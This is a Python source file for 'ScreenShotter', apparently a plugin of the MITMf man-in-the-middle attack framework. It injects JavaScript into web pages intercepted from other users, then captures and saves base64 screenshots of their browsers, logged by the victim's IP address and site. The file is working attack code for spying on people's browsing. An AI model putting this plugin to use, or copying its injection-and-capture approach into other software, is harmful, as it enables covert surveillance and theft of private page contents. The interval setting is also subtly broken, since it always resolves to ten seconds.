#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

"""

[enabled | disabled] by @xtr4nge

"""

import logging
import base64
import urllib
import re

from datetime import datetime
from plugins.Inject import Inject
from plugins.plugin import Plugin

from configobj import ConfigObj

mitmf_logger = logging.getLogger('mitmf')

class ScreenShotter(Inject, Plugin):
	name     = 'ScreenShotter'
	optname  = 'screen'
	desc     = 'Uses HTML5 Canvas to render an accurate screenshot of a clients browser'
	ver      = '0.1'
	has_opts = True

	# @xtr4nge
	def getStatus(self):
		self.pluginStatus = ConfigObj("config/plugins.conf")
		if self.pluginStatus['plugins'][self.optname]['status'] == "enabled":
			return True
		else:
			return False

	def initialize(self, options):
		self.interval = 10 or options.interval
		Inject.initialize(self, options)
		self.html_payload = self.get_payload()

	def clientRequest(self, request):
		if self.getStatus():
			if 'saveshot' in request.uri:
				request.printPostData = False
				client = request.client.getClientIP()
				img_file = '{}-{}-{}.png'.format(client, request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
				try:
					with open('./logs/' + img_file, 'wb') as img:
						img.write(base64.b64decode(urllib.unquote(request.postData).decode('utf8').split(',')[1]))
						img.close()
	
					mitmf_logger.info('{} [ScreenShotter] Saved screenshot to {}'.format(client, img_file))
				except Exception as e:
					mitmf_logger.error('{} [ScreenShotter] Error saving screenshot: {}'.format(client, e))

	def get_payload(self):
		canvas = re.sub("SECONDS_GO_HERE", str(self.interval*1000), open("./core/javascript/screenshot.js", "rb").read())
		return '<script type="text/javascript">' + canvas + '</script>'

	def pluginOptions(self, options):
		options.add_argument("--interval", dest="interval", type=int, metavar="SECONDS", default=None, help="Interval at which screenshots will be taken (default 10 seconds)")